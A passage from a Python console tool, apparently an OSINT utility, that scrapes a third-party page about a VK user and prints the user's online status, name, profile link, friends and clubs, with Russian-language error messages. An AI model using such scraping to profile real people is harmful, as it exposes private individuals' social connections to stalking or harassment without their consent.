            console(Fore.RED + f"Ошибка получения данных. Статус код: {response.status_code}" + Fore.RESET)
            sys.exit()

    except requests.RequestException as e:
        console(Fore.RED + f"Ошибка запроса: {e}" + Fore.RESET)
        sys.exit()
        
        
    try:
        response = requests.get(ONLYVK_FRIENDS_URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            try:
                soup = BeautifulSoup(response.content, 'html.parser')

                status = soup.find('div', {'id': 'profile_online'})
                status = status.text.strip() if status else "Неизвестно"
                
                name_block = soup.find('div', {'id': 'name'})
                name = name_block.text.strip() if name_block else "Неизвестно"
                profile_url = name_block.find('a')['href'] if name_block and name_block.find('a') else "Неизвестно"
                

                items_block = soup.find('div', {'id': 'content'})
                if items_block:
                    items = items_block.find_all('a', href=True)
                    
                    unique_clubs = set() 
                    
                    friends = []
                    followers = []
                    clubs = []

                    for item in items:
                        link = item['href']
                        text = item.text.strip()
                        
                        if "vk.com/id" in link or "vk.com/profile" in link:
                            if text:
                                friends.append({"name": text, "link": link})
                        elif "vk.com/public" in link or "vk.com/club" in link:
                            if text and link not in unique_clubs:
                                clubs.append({"name": text, "link": link})
                                unique_clubs.add(link)
                    
                    if friends:
                        print(Fore.CYAN + "\n Друзья:", end='')
                        for friend in friends:
                            print(Fore.GREEN + f" {friend['name']} - {friend['link']}, ", end='')
                    else:
                        console(Fore.RED + " Не найдено")
                    
                else:
                    console(Fore.RED + " Не удалось найти блок с друзьями, клубами или подписчиками")
            
            except Exception as e:
                console(Fore.RED + f"Ошибка парсинга HTML: {e}" + Fore.RESET)
                sys.exit()
        else:
            console(Fore.RED + f"Ошибка получения данных. Статус код: {response.status_code}" + Fore.RESET)
            sys.exit()

    except requests.RequestException as e:
        console(Fore.RED + f"Ошибка запроса: {e}" + Fore.RESET)
        sys.exit()
        
if CHOICE == "13":
    latest_version = check_for_updates(repo_owner, repo_name, current_version)